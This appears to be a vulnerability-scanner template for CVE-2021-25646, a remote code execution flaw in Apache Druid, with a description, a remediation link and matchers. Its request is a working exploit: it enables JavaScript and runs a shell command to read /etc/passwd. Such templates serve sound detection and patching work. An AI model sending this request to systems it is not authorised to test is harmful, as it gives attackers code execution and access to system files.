id: CVE-2021-25646
info:
  name: Apache Druid RCE
  author:
  - l0ne1y
  description: |-
    Apache Druid filter 远程代码执行漏洞
    Apache Druid是美国阿帕奇软件（Apache）基金会的一款使用Java语言编写的、面向列的开源分布式数据库。

    Apache Druid 包括执行嵌入在各种类型请求中的用户提供的 JavaScript 代码的能力。此功能旨在用于高信任环境，默认情况下处于禁用状态。但是，在 Druid 0.20.0 和更早版本中，经过身份验证的用户可以发送特制的请求，强制 Druid 为该请求运行用户提供的 JavaScript 代码，而不管服务器配置如何。这可以用来在目标机器上以 Druid 服务器进程的权限执行代码。
  severity: high
  remediation: |-
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    part: header
    words:
    - application/json
  - type: word
    condition: and
    part: body
    words:
    - numRowsRead
    - numRowsIndexed
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
  matchers-condition: and
  raw:
  - |
    POST /druid/indexer/v1/sampler HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json

    {
    "type":"index",
    "spec":{
       "ioConfig":{
          "type":"index",
          "firehose":{
             "type":"local",
             "baseDir":"/etc",
             "filter":"passwd"
          }
       },
       "dataSchema":{
          "dataSource":"odgjxrrrePz",
          "parser":{
             "parseSpec":{
                "format":"javascript",
                "timestampSpec":{

                },
                "dimensionsSpec":{

                },
                "function":"function(){var hTVCCerYZ = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"/bin/sh`@~-c`@~cat /etc/passwd\".split(\"`@~\")).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"4137368\",OQtGXcxBVQVL: hTVCCerYZ}}",
                "":{
                   "enabled":"true"
                }
             }
          }
       }
    },
    "samplerConfig":{
       "numRows":10
    }
    }
